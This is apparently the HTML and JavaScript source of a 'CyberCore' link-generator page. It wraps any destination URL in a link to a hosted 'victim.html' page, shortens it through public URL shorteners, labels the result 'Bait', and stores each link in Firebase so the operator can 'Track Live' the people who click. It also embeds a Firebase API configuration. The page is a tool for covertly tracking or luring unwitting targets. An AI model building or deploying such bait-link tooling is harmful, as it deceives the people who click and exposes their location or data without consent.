<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Generator | CyberCore v15</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .cyber-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border: 1px solid #f0f0f0; }
        .animate-in { animation: fadeIn 0.5s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .engine-tag { font-size: 8px; font-weight: 900; padding: 2px 8px; border-radius: 5px; text-transform: uppercase; }
        /* Table scroll fix */
        .custom-scrollbar::-webkit-scrollbar { height: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen p-4 flex flex-col items-center font-sans">

    <div class="w-full max-w-2xl mb-6 flex items-center justify-between">
        <button onclick="location.href='dashboard.html'" class="bg-white p-3 rounded-2xl shadow-sm hover:text-green-600 transition active:scale-90">
            <i class="fa-solid fa-chevron-left"></i>
        </button>
        <h1 class="text-xl font-black text-gray-800 italic uppercase tracking-tighter">Link <span class="text-green-600">Generator</span></h1>
        <div class="w-10"></div>
    </div>

    <div class="cyber-card w-full max-w-2xl rounded-[2.5rem] shadow-2xl overflow-hidden mb-8">
        <div class="bg-gray-900 p-8 text-center text-white">
            <p class="text-[10px] font-black text-green-500 tracking-[0.3em] uppercase mb-2">Protocol: Multi-API Transaction Mode</p>
            <h2 class="text-lg font-bold italic">Generate Tracking Node</h2>
        </div>

        <div class="p-8 space-y-6">
            <div>
                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2 ml-1">Destination URL</label>
                <input type="text" id="redirectUrl" placeholder="https://www.youtube.com/watch?v=..." 
                       class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-green-500 transition-all text-sm">
            </div>

            <button id="genBtn" onclick="generateAndSave()" class="w-full bg-gray-900 text-white font-black py-4 rounded-2xl hover:bg-black transition-all uppercase tracking-widest text-sm shadow-xl active:scale-95 flex items-center justify-center gap-2">
                <span id="btnText">Generate & Save Link</span>
            </button>

            <div id="resultBox" class="hidden space-y-4 pt-4 border-t border-dashed border-gray-200 animate-in">
                
                <div class="p-4 bg-gray-50 rounded-2xl border border-gray-100 relative">
                    <p class="text-[9px] font-black text-gray-400 mb-1 uppercase tracking-widest">Tracking URL (Long):</p>
                    <p id="longLinkDisplay" class="text-[10px] font-mono font-medium text-gray-500 break-all pr-10">--</p>
                    <button onclick="copyToClipboard('longLinkDisplay')" class="absolute right-4 top-8 text-gray-400 hover:text-gray-900">
                        <i class="fa-solid fa-copy text-lg"></i>
                    </button>
                </div>

                <div class="p-5 bg-green-50 rounded-3xl border-2 border-dashed border-green-200 relative">
                    <div class="flex justify-between items-center mb-2">
                        <p class="text-[10px] font-black text-green-600 uppercase tracking-widest">Short Link (Bait):</p>
                        <span id="engineBadge" class="engine-tag bg-green-600 text-white font-mono">Scanning...</span>
                    </div>
                    <p id="finalLink" class="text-xs font-mono font-bold text-gray-700 break-all pr-12">--</p>
                    <button onclick="copyToClipboard('finalLink')" class="absolute right-4 top-12 text-green-600 hover:scale-110 transition-transform">
                        <i class="fa-solid fa-copy text-2xl"></i>
                    </button>
                </div>

            </div>
        </div>
    </div>

    <div class="w-full max-w-2xl bg-white rounded-[2.5rem] shadow-sm border border-gray-100 overflow-hidden mb-10">
        <div class="p-6 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
            <h3 class="font-black text-xs uppercase text-gray-800 italic tracking-tight">Recent Transactions</h3>
            <span class="text-[9px] font-bold text-zinc-400">Total History Logs</span>
        </div>
        <div class="overflow-x-auto custom-scrollbar">
            <table class="w-full text-left text-xs">
                <thead class="bg-gray-50 text-gray-400 font-bold uppercase border-b">
                    <tr>
                        <th class="p-4">Timestamp</th>
                        <th class="p-4">Unique ID</th>
                        <th class="p-4">Action</th>
                    </tr>
                </thead>
                <tbody id="historyBody" class="font-bold text-gray-600">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
        // --- Firebase (Old Configuration Restored) ---
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            authDomain: "in-app-update-21c61.firebaseapp.com",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
            storageBucket: "in-app-update-21c61.firebasestorage.app",
            messagingSenderId: "1013483026768",
            appId: "1:1013483026768:web:c5f54060842f9672431455"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userMobile = localStorage.getItem("loggedInUser") || "Admin_User";

        // --- Multi-Engine API Logic ---
        async function getShortLink(longUrl) {
            const engines = [
                { name: "is.gd", url: `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}` },
                { name: "da.gd", url: `https://da.gd/s?url=${encodeURIComponent(longUrl)}` },
                { name: "tinyurl", url: `https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}` },
                { name: "v.gd", url: `https://v.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}` }
            ];

            for (let engine of engines) {
                try {
                    const response = await fetch(engine.url);
                    if (response.ok) {
                        const short = await response.text();
                        if (short.startsWith("http")) return { short, name: engine.name };
                    }
                } catch (e) { console.log(engine.name + " bypass failed..."); }
            }
            return { short: longUrl, name: "Direct" };
        }

        // --- Transaction & Save Logic ---
        async function generateAndSave() {
            const redirect = document.getElementById('redirectUrl').value;
            if(!redirect.startsWith('http')) return alert("Enter valid URL");

            const btn = document.getElementById('genBtn');
            const btnText = document.getElementById('btnText');
            btnText.innerText = "âš¡ SYNCING ENGINES...";
            btn.disabled = true;

            const githubPage = "https://sufih4x-rgb.github.io/cybersecurity/victim.html";
            const encodedRedirect = btoa(redirect);
            const longUrl = `${githubPage}?id=${userMobile}&r=${encodedRedirect}`;

            const result = await getShortLink(longUrl);

            // Save Transaction to Firebase (Old Logic)
            const newRef = db.ref('users/' + userMobile + '/linkHistory').push();
            await newRef.set({
                timestamp: new Date().toLocaleString(),
                url: result.short,
                dest: redirect
            });

            // Update UI
            document.getElementById('longLinkDisplay').innerText = longUrl;
            document.getElementById('finalLink').innerText = result.short;
            document.getElementById('engineBadge').innerText = result.name;
            document.getElementById('resultBox').classList.remove('hidden');

            btnText.innerText = "Generate & Save Link";
            btn.disabled = false;
        }

        // --- History Loader (Old Logic) ---
        function loadHistory() {
            db.ref('users/' + userMobile + '/linkHistory').on('value', snap => {
                const body = document.getElementById('historyBody');
                body.innerHTML = "";
                snap.forEach(child => {
                    const data = child.val();
                    const row = `
                        <tr class="border-b border-gray-50 hover:bg-gray-50 animate-in">
                            <td class="p-4 text-gray-400">${data.timestamp}</td>
                            <td class="p-4 text-blue-600 font-mono tracking-tighter">${child.key}</td>
                            <td class="p-4">
                                <button onclick="trackNow('${child.key}')" class="bg-green-100 text-green-700 px-4 py-2 rounded-xl hover:bg-green-200 transition font-black uppercase text-[10px]">
                                    Track Live
                                </button>
                            </td>
                        </tr>`;
                    body.insertAdjacentHTML('afterbegin', row);
                });
            });
        }

        function trackNow(id) {
            location.href = `tracking.html?target=${id}`;
        }

        function copyToClipboard(id) {
            const text = document.getElementById(id).innerText;
            navigator.clipboard.writeText(text);
            alert("Copied!");
        }

        window.onload = loadHistory;
    </script>
</body>
</html>
